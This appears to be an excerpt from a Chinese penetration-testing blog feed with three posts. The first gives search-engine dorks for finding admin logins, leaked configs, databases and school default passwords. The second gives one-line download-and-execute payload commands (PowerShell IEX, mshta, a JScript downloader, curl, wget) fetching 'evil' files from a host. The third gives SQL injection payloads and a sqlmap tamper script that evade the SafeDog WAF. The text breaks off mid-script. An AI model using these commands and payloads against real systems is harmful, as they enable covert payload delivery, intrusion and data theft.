        <content type="html"><![CDATA[<a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>在渗透测试中，利用搜索引擎信息收集还是很不错，常常有意外的收获，也可以用在一些镜像库里面搜索信息收集</li><li>还有之前看到的一些，都总结分享一下</li></ul><h2 id="主要的常用一些语法"><a href="#主要的常用一些语法" class="headerlink" title="主要的常用一些语法"></a>主要的常用一些语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">site：可以限制你搜索范围的域名</span><br><span class="line"></span><br><span class="line">inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.</span><br><span class="line"></span><br><span class="line">intext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)</span><br><span class="line"></span><br><span class="line">intitle: 查包含关键词的页面，一般用于社工别人的webshell密码</span><br><span class="line"></span><br><span class="line">filetype：搜索文件的后缀或者扩展名</span><br><span class="line"></span><br><span class="line">intitle：限制你搜索的网页标题.</span><br><span class="line"></span><br><span class="line">link: 可以得到一个所有包含了某个指定URL的页面列表.</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><strong>查找后台地址：site域名</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个真的好用</span><br><span class="line">查看某公司的表格找账户：site:域名 filetype:xlsx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找上传漏洞：site:域名 inurl:file|load|editor|Files**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">找web编辑器：</span><br><span class="line"></span><br><span class="line">site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</span><br><span class="line"></span><br><span class="line">存在的数据库：site:域名 filetype:mdb|asp|#</span><br><span class="line"></span><br><span class="line">查看脚本类型：site:域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp</span><br></pre></td></tr></table></figure><h2 id="挖教育常用的"><a href="#挖教育常用的" class="headerlink" title="挖教育常用的"></a>挖教育常用的</h2><p><strong>site：xxx.edu.cn intext：学号</strong></p><p><strong>site：xxx.edu.cn intext：默认密码</strong></p><p><strong>site：xxx.edu.cn intext：登陆/后台登陆/登陆管理等的登陆页面</strong></p><p>找遗留的各种数据库报错,物理路径,数据库版本,服务器探针类文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">site:*.tw  inurl:&#x2F;phpinfo.php</span><br><span class="line">filetype:log &quot;PHP Parse error&quot;| &quot;PHP Warning&quot;</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_fetch_array()</span><br><span class="line">site:*.jp  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: getimagesize()</span><br><span class="line">site:*.br  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: array_merge()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_fetch_assoc()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: mysql_result()</span><br><span class="line">site:*.jp  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: pg_exec()</span><br><span class="line">site:*.tw  &quot;id&#x3D;&quot; &amp; intext:&quot;Warning: require()</span><br><span class="line">inurl:&#x2F;robots.txt site:*.*</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1 目录遍历漏洞  语法为: site:baidu.com intitle:index.of</span><br><span class="line"></span><br><span class="line">2 配置文件泄露  语法为: site:baidu.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | extra | ext:ini</span><br><span class="line"></span><br><span class="line">3 数据库文件泄露  site:baidu.com ext:sql | ext:dbf | ext:mdb</span><br><span class="line"></span><br><span class="line">4 日志文件泄露 site:baidu.com ext:log</span><br><span class="line"></span><br><span class="line">5 备份和历史文件 site:baidu.com ext:bkf | ext:bkp | ext:bak | extld | ext:backup</span><br><span class="line"></span><br><span class="line">6 SQL错误  site:baidu.com intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”</span><br><span class="line"></span><br><span class="line">7 公开文件信息  site:baidu.com ext:doc | ext:docx | extdt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class="line"></span><br><span class="line">8  phpinfo()  site:baidu.com ext:php intitle:phpinfo “published by the PHP Group” </span><br><span class="line"></span><br><span class="line">9.不可靠程序透露的信息 </span><br><span class="line"></span><br><span class="line">（1)php version： </span><br><span class="line"></span><br><span class="line">intitle:phpinfo</span><br><span class="line"></span><br><span class="line">inurl:info.php</span><br><span class="line"></span><br><span class="line">(2)程序中含有SQL注入漏洞并且路径可以修改弱口 </span><br><span class="line"></span><br><span class="line">&quot;advanced guestbook * powered&quot;:</span><br><span class="line"></span><br><span class="line">inurl:addentry.php</span><br><span class="line"></span><br><span class="line">intitle:&quot;View img&quot; inurl:viewimg.php</span><br><span class="line"></span><br><span class="line">10.安全扫描报告 &quot;Assessment report&quot; &quot;nessus&quot;: filetype:pdf</span><br><span class="line"></span><br><span class="line">11.数据库程序和错误文件 </span><br><span class="line"></span><br><span class="line">&quot;Welcome to phpmyadmin ***&quot; &quot;running on * as root@*&quot; intitle:phpmyadmin</span><br><span class="line"></span><br><span class="line">&quot;mysql error with query&quot;</span><br><span class="line"></span><br><span class="line">12.暴库</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc&#x2F;conn.asp </span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc+conn.asp </span><br><span class="line"></span><br><span class="line">intext:to parent directory 目录遍历</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc&#x2F;conn.asp</span><br><span class="line"></span><br><span class="line">inurl:&#x2F;inc+conn.asp</span><br><span class="line"></span><br><span class="line">intext:to parent directory+intext:mdb site:xxx.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句话下载payload（持续更新）</title>
      <link href="/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>js一句话下载payload<br>windows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">​</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">​</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\test&gt;cscript &#x2F;nologo dowfile2.js http:&#x2F;&#x2F;192.168.1.1&#x2F;eval.exe</span><br></pre></td></tr></table></figure><p>还有最简单的powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&#39;,&#39;E:\robots.txt&#39;)</span><br></pre></td></tr></table></figure><p>远程执行命令，且无文件落地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.174.1:1234/evil.txt'))"</span></span><br></pre></td></tr></table></figure><p>远程目标主机上执行以下命令实现下载执行操作，且无文件落地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://192.168.174.1:1234/evil.hta</span><br></pre></td></tr></table></figure><p>curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.174.1:1234/evil.exe -o evil.exe</span><br></pre></td></tr></table></figure><p>wget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.174.1:1234/evil.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从绕过安全狗到编写tamper脚本</title>
      <link href="/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/04/21/%E4%BB%8E%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%88%B0%E7%BC%96%E5%86%99tamper%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li><a href="#0x00__4">0x00 简述</a></li><li><a href="#0x01__21">0x01 首先我们要判断哪个关键字被拦截了</a></li><li><a href="#0x02__44">0x02 一些简单的知识点</a></li><li><a href="#0x03__95">0x03 总结安全狗拦截的点</a></li><li><a href="#0x04_Sqlmap_tamper_150">0x04 Sqlmap tamper的编写</a></li><li><a href="#0x05_tamper_229">0x05 tamper主要的三个部分</a></li><li><a href="#0x06_tamper_279">0x06 tamper编写测试方法</a></li><li><a href="#0x07__306">0x07 结束</a></li></ul><h1 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00 简述"></a>0x00 简述</h1><ul><li>安全狗这些waf都是有一个特性，都是基于正则匹配去过滤的</li><li>但是实际情况是需要权衡可用性和安全性</li><li>当然厂商肯定是考虑到用户体验，所以不能出现什么东西都拦截</li><li>所以最终就是正则的绕过</li><li>注意：</li><li>版本不同，他的正则规则也是不一样的</li><li>所以有的payload在新老版本是不能同吃。</li><li>但是没有关系，你学会这么绕，这都不是问题。</li></ul><h1 id="0x01-首先我们要判断哪个关键字被拦截了"><a href="#0x01-首先我们要判断哪个关键字被拦截了" class="headerlink" title="0x01 首先我们要判断哪个关键字被拦截了"></a>0x01 首先我们要判断哪个关键字被拦截了</h1><p>我们以 order by 3 这个简单的语句为例子</p><p>提供思路就是破坏单词去测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3  （拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 ordwer by 3 （破坏了order 没有拦截）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order bay 3 （破坏了by 没有拦截）</span><br></pre></td></tr></table></figure><p>所以狗拦截的东西就是 order by 两个一起出现</p><p>所有后面的测试都是按照这个思路初步的判断。</p><h1 id="0x02-一些简单的知识点"><a href="#0x02-一些简单的知识点" class="headerlink" title="0x02 一些简单的知识点"></a>0x02 一些简单的知识点</h1><ul><li>绕过的一些基础</li><li>MySql注释内语句也可执行（/*! */）</li><li><code>/*! ....*/</code> 在其他很多地方都是注释。</li><li>但是在mysql中不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在<code>/*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*!50001 select * from test *&#x2F;;</span><br></pre></td></tr></table></figure><p>这里的50001表示假如 数据库是5.00.01以上版本，该语句才会被执行，基本上只做一个版本的判断。</p><ul><li>Mysql常用的符号</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">换行符号</span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">注释符合</span><br><span class="line">%23</span><br><span class="line"></span><br><span class="line">空白字符</span><br><span class="line">&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;</span><br><span class="line"></span><br><span class="line">不同的数据库不太一样，可以自己查一下</span><br></pre></td></tr></table></figure><p>还有一些bypass的常用注释符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h1 id="0x03-总结安全狗拦截的点"><a href="#0x03-总结安全狗拦截的点" class="headerlink" title="0x03 总结安全狗拦截的点"></a>0x03 总结安全狗拦截的点</h1><ul><li>and 1</li><li>只要and后面接数字，安全狗就会拦截</li><li>order by</li><li>order 后面接by，安全狗就会拦截</li><li>union select</li><li>只要union select 结合就被拦截,实测发现还是对select这个词的更加严格，主要饶select</li><li>database()</li><li>database后面接括号，安全狗就会拦截</li></ul><p>下面是测试成功的例子</p><p>order by 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试 order aby不拦截 ，我们让 by前面的注释掉就可以绕过</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1 order %23a%0aby 3</span><br></pre></td></tr></table></figure><p>union select绕过 同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,2,3</span><br></pre></td></tr></table></figure><p>database()绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,%23a%0adatabase&#x2F;*!*&#x2F;(),3</span><br></pre></td></tr></table></figure><p>一个完整的union查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*!select*&#x2F; 1,group_concat(table_name),3 %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure><p>还有一种注释版本号的 绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*!44466select*&#x2F; 1,database&#x2F;*!()*&#x2F;,3</span><br></pre></td></tr></table></figure><h1 id="0x04-Sqlmap-tamper的编写"><a href="#0x04-Sqlmap-tamper的编写" class="headerlink" title="0x04 Sqlmap tamper的编写"></a>0x04 Sqlmap tamper的编写</h1><p>tamper是sqlmap对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。</p><p>为了好理解直接典例深刨析：</p><p>我们理解一下一个常用的tamper ：space2comment.py</p><p>这个脚本的功能就是：用“/**/”替换空格符</p><p>下面是完整的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2020 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)</span><br><span class="line">See the file &#39;LICENSE&#39; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line">    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal &#x3D; payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal &#x3D; &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace &#x3D; False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace &#x3D; True</span><br><span class="line">                    retVal +&#x3D; &quot;&#x2F;**&#x2F;&quot;</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:</span><br><span class="line">                quote &#x3D; not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:</span><br><span class="line">                doublequote &#x3D; not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal +&#x3D; &quot;&#x2F;**&#x2F;&quot;</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal +&#x3D; payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure><p>​</p><h1 id="0x05-tamper主要的三个部分"><a href="#0x05-tamper主要的三个部分" class="headerlink" title="0x05 tamper主要的三个部分"></a>0x05 tamper主要的三个部分</h1><ul><li>第一部分priority</li><li>定义脚本的优先级，用于有多个tamper脚本的先后顺序</li><li>第二部分dependencies函数</li><li>该脚本适用/不适用的范围，也可以不写。</li><li>第三部分tamper函数</li><li>主要就是我们绕过的精华，要替换的内容。</li></ul><p>priority优先级</p><p>使用了多个tamper时，PRIORITY的参数等级较高的tamper先使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br></pre></td></tr></table></figure><p>有大概七个等级 LOWEST LOWER = LOW NORMAL HIGH HIGHER HIGHEST</p><p>dependencies函数主要是提示用户适用范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">上文中没写，就是没有提示，你要自己知道，其实不写也行就直接pass</span><br><span class="line">def dependencies():</span><br><span class="line">     singleTimeWarnMessage(&quot;这里输入想显示的内容“)</span><br></pre></td></tr></table></figure><p>tamper是重头戏</p><p>这是一个简单的双写绕过，tamper里面主要是一个替换的过程</p><p>payload就是那些关键词select union这下，经过替换只有return 回去，就是处理好的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&#39;union&#39;,&#39;uniounionn&#39;)</span><br></pre></td></tr></table></figure><p>所以中间具体怎么替换就是你的事情了。只有最后return回去就好了</p><h1 id="0x06-tamper编写测试方法"><a href="#0x06-tamper编写测试方法" class="headerlink" title="0x06 tamper编写测试方法"></a>0x06 tamper编写测试方法</h1><p>这里我说下几个坑点：</p><ul><li><p>手工过和写tamper不一样，sqlmap的语句和你用的并不一样</p></li><li><p>我有两个建议，一个是用slqmap 挂代理到burp去看到底可以不，我没用这个方法，点的有点累</p></li><li><p>我是打开 -v 参数，去看payload和提示，看哪里断开，复制payload去手工看看，绕过编写一下tamper</p></li><li><p>还有调试过程中 要打开–flush 参数刷新缓存</p></li><li><p>还有一个就是你的python代码能力了，如果你只是用简单的replace(）函数，就要注意替换的顺序，</p><ul><li>例如会用到的相似的函数：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SESSION_USER()  CURRENT_USER()  USER() </span><br><span class="line">这几个都有 user（） 如果你在最前面 替换了user（） </span><br><span class="line">那么后面就会出现CURRENT_%23a%0aUSER&#x2F;*!*&#x2F;() 我这种绕过就不兼容了</span><br><span class="line">得在后面再自己调整</span><br></pre></td></tr></table></figure><ul><li>下面是我的绕过参数：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.211.55.4&#x2F;Less-2&#x2F;?id&#x3D;1&quot; --tamper dogz.py --random-agent --flush -v 3 --batch --dbms mysql --current-user –-tech&#x3D;U</span><br></pre></td></tr></table></figure><h1 id="0x07-结束"><a href="#0x07-结束" class="headerlink" title="0x07 结束"></a>0x07 结束</h1><p>绕狗脚本给大家，如果跑的时候失效了可以按照上面的方法修改修改就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3.7</span><br><span class="line"># Author:Zeo</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.common import singleTimeWarnMessage</span><br><span class="line">from lib.core.enums import DBMS</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    singleTimeWarnMessage(&quot;Zeo_bypass_safedog4.0&quot;)</span><br><span class="line">    </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload&#x3D;payload.replace(&#39;AND&#39;,&#39;&#x2F;*!44466AND*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;ORDER&#39;,&#39;&#x2F;*!44466order*&#x2F;&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;BY&#39;,&#39;%23a%0aby&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;USER()&#39;,&#39;%23a%0aUSER&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;DATABASE()&#39;,&#39;%23a%0aDATABASE&#x2F;*!*&#x2F;()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;SESSION_%23a%0aUSER&#x2F;*!*&#x2F;()&#39;,&#39;%23a%0aSESSION_USER()&#39;)</span><br><span class="line">    payload&#x3D;payload.replace(&#39;UNION ALL SELECT&#39;,&#39;UNION ALL 